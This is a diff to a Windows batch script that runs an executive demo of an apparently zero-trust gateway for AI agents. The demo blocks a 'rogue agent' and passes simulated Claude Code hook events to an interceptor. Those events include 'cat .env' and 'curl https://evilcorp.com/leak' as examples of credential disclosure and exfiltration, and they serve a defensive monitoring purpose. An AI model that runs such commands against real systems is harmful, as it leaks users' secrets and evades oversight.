@@ -1,5 +1,6 @@
 @echo off
 setlocal EnableDelayedExpansion
+cd /d "%~dp0"
 title BAP Zero-Trust Platform - CIO Executive Demonstration
 mode con: cols=100 lines=35
 color 0B
@@ -28,6 +29,10 @@ if "%SERVER_URL%"=="" (
     )
 )
 if "%SERVER_URL%"=="" set SERVER_URL=http://localhost:8080
+
+:: Reset any lingering sessions from prior interrupted runs so the dashboard starts completely fresh
+curl.exe -s --max-time 2 --connect-timeout 2 -X POST "%SERVER_URL%/api/v1/sessions/reset" >nul 2>&1
+
 set SESS_ID=sess-cio-demo-%RANDOM%
 set AGENT_PID=%RANDOM%
 
@@ -283,17 +288,39 @@ echo   * Option 3 (Active Demo): Zero-dependency native PEP (bapgateway.exe) run
 echo   * Option 1 (Cloud-Native): Production Envoy Proxy on Podman/Docker (see envoy\ENVOY_PODMAN_GUIDE.md).
 echo   Without a BAP Grant, raw socket calls are terminated with HTTP 401/403 at the perimeter."
 echo.
+
+:: Ensure Gateway PEP is active on port 9090
+powershell -NoProfile -Command "if (Get-NetTCPConnection -LocalPort 9090 -State Listen -ErrorAction SilentlyContinue) { exit 0 } else { exit 1 }"
+if %errorlevel% neq 0 (
+    echo [*] Auto-starting Gateway Policy Enforcement Point [bapgateway.exe] on port 9090...
+    start "BAP Gateway PEP 9090" /min "%~dp0bapgateway.exe" -port 9090 -controlplane %SERVER_URL%
+    ping -n 2 127.0.0.1 >nul
+)
+
 echo  [1/2] Launching Rogue Agent (bypasses bap-sdk, attempts direct raw socket access)...
 python .\python-agent\rogue_agent.py
+
+echo.
+echo  ====================================================================================================
+echo  ==^> LOOK AT YOUR BROWSER DASHBOARD NOW:
+echo      1. The Gateway PEP blocked the rogue socket call with HTTP 401 Unauthorized.
+echo      2. A RED toast appeared on the Live Workload Radar: "BLOCKED ROGUE AGENT".
+echo      3. The security denial counter incremented on the dashboard.
+echo  ====================================================================================================
+echo.
+echo Press [ENTER] to launch Part 2: Governed Agent (SDK + BAP Grant authorization)...
+pause >nul
 
 echo.
 echo  [2/2] Launching Governed Agent (uses bap-sdk, acquires BAP Grant, authorized at Gateway)...
 python .\python-agent\governed_agent.py
 
 echo.
+echo  ====================================================================================================
 echo  ==^> KEY TAKEAWAY FOR CIO:
 echo      Even with ZERO client cooperation, rogue agents CANNOT touch internal systems.
 echo      The Gateway Policy Enforcement Point guarantees Zero-Standing Privilege at the network perimeter.
+echo  ====================================================================================================
 echo.
 echo Press [ENTER] to advance to Step 9 (Live Claude Code and Final Wrap-up)...
 pause >nul
@@ -312,29 +339,55 @@ echo   Detected binary on this machine: %CLAUDE_BIN%
 echo   Environment configuration:      %CLAUDE_ENV%"
 echo.
 echo  Options:
-echo  [1] Run automated governed prompt ("run git status and check .env")
-echo  [2] Launch full interactive Claude Code terminal (governed by BAP)
+echo  [1] Run automated governed Claude Code hook demonstration (sub-2ms verification)
+echo  [2] Launch live interactive Claude Code terminal (governed by BAP)
 echo  [3] Skip to demonstration summary
 echo.
-set /p LAUNCH_CLAUDE="Select option (1, 2, or 3): "
+set /p LAUNCH_CLAUDE="Select option (1, 2, or 3) [default: 3]: "
+if "%LAUNCH_CLAUDE%"=="" set LAUNCH_CLAUDE=3
 
 if "%LAUNCH_CLAUDE%"=="1" (
     echo.
-    echo [*] Executing automated Claude prompt with BAP interceptor...
-    call run_claude_ollama.bat "run git status and check .env"
+    echo [*] Executing automated Claude Code hook demonstration (cchook\interceptor.exe)...
+    set CLAUDE_DEMO_SESS=sess-claude-auto-%RANDOM%
+    curl.exe -s -X POST "%SERVER_URL%/api/v1/sessions/start" ^
+        -H "Content-Type: application/json" ^
+        -d "{\"session_id\":\"!CLAUDE_DEMO_SESS!\",\"app_id\":\"claude-code\",\"user_id\":\"%DEMO_USER%\",\"hostname\":\"%COMPUTERNAME%\"}" >nul 2>&1
+
+    set BAP_SESSION_ID=!CLAUDE_DEMO_SESS!
+    echo.
+    echo  [TOOL 1/3] Claude requests 'git status' (developer productivity)...
+    echo {"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"git status"}} | "%~dp0cchook\interceptor.exe"
+    echo.
+    echo  [TOOL 2/3] Claude requests 'cat .env' (sensitive credential disclosure)...
+    echo {"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"cat .env"}} | "%~dp0cchook\interceptor.exe"
+    echo.
+    echo  [TOOL 3/3] Claude requests 'curl https://evilcorp.com/leak' (unauthorized egress)...
+    echo {"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"curl https://evilcorp.com/leak"}} | "%~dp0cchook\interceptor.exe"
+    echo.
+
+    curl.exe -s --max-time 2 --connect-timeout 2 -X POST "%SERVER_URL%/api/v1/sessions/end" ^
+        -H "Content-Type: application/json" ^
+        -d "{\"session_id\":\"!CLAUDE_DEMO_SESS!\",\"reason\":\"automated hook test completed\"}" >nul 2>&1
+    echo [+] Claude Code demonstration session closed ^& deregistered cleanly.
 )
 if "%LAUNCH_CLAUDE%"=="2" (
     echo.
     echo [*] Launching interactive Claude Code in dedicated governed window...
     echo [*] Type 'exit' inside Claude Code when finished to return here.
     start /wait cmd.exe /c "call run_claude_ollama.bat"
+    curl.exe -s --max-time 2 --connect-timeout 2 -X POST "%SERVER_URL%/api/v1/sessions/reset" >nul 2>&1
 )
 
 echo.
-echo [*] Closing demonstration session %SESS_ID%...
+echo [*] Deregistering demonstration session %SESS_ID% from Central Control Plane...
 curl.exe -s -X POST "%SERVER_URL%/api/v1/sessions/end" ^
     -H "Content-Type: application/json" ^
     -d "{\"session_id\":\"%SESS_ID%\",\"reason\":\"CIO executive demo completed gracefully\"}" >nul
+echo [+] Demonstration session closed & deregistered.
+
+:: Clean up any other active agent sessions so the radar has 0 stale ghosts
+curl.exe -s --max-time 2 --connect-timeout 2 -X POST "%SERVER_URL%/api/v1/sessions/reset" >nul 2>&1
 
 echo.
 echo ====================================================================================================
@@ -354,7 +407,32 @@ echo  9. Seamless Portability: Runs via claude-code.cmd at work or claude on per
 echo 10. Universal SDK Integration: Python agents (LangChain/CrewAI/AutoGen) governed in 3 lines of code.
 echo.
 echo ====================================================================================================
-echo Press any key to exit...
-pause >nul
-endlocal
+echo  DEMO ENVIRONMENT TEARDOWN
+echo ====================================================================================================
+echo.
+echo  Choose teardown option:
+echo  [1] Clean shutdown: Stop all background services (ports 8080 & 9090)
+echo  [2] Keep Control Plane running for continued Activity Inspector browser inspection [Default]
+echo.
+set /p TEARDOWN_CHOICE="Select option (1 or 2) [default: 2]: "
+if "%TEARDOWN_CHOICE%"=="" set TEARDOWN_CHOICE=2
+
+if "%TEARDOWN_CHOICE%"=="1" (
+    echo.
+    echo [*] Stopping BAP Gateway PEP on port 9090...
+    taskkill /F /IM bapgateway.exe >nul 2>&1
+    echo [*] Stopping BAP Control Plane on port 8080...
+    taskkill /F /IM bapcontrolplane.exe >nul 2>&1
+    echo [+] All BAP demo processes cleanly terminated. Ports 8080 and 9090 are freed!
+) else (
+    echo.
+    echo [*] BAP Control Plane remains active on http://localhost:8080.
+    echo [*] When finished inspecting, simply run: stop_demo.bat
+)
+echo.
+echo ====================================================================================================
+echo  Demonstration finished. This console window will remain open.
+echo  Type 'exit' to close this window, or re-run 'demo_cio_interactive.bat' anytime.
+echo ====================================================================================================
+echo.
 
